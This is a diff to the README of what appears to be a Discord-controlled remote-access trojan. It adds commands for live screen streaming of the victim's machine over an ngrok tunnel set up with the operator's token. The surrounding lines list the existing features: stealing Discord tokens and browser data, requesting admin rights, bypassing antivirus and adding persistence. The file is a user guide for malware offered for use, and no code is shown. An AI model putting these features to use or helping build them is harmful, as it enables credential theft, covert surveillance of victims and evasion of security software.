@@ -100,6 +100,9 @@ File extension can be modified to:
 !recent [browser] - Browser history
 !discord - Extract Discord tokens
 !browsers - Extract browser data
+!live - Start screen streaming (you need to set !key first)
+!stop - Stop the stream
+!status - Check if stream is running
 
 **Other:**
 !msg <message> - Show message box
@@ -109,6 +112,7 @@ File extension can be modified to:
 !su - Request admin privileges
 !avbypass - Bypass antivirus
 !persist - Add persistence
+!key <your_ngrok_auth_token> - Set your ngrok auth token (get from ngrok.com, easy and free)
 
 
 ## 🛠 Discord Bot Setup Guide
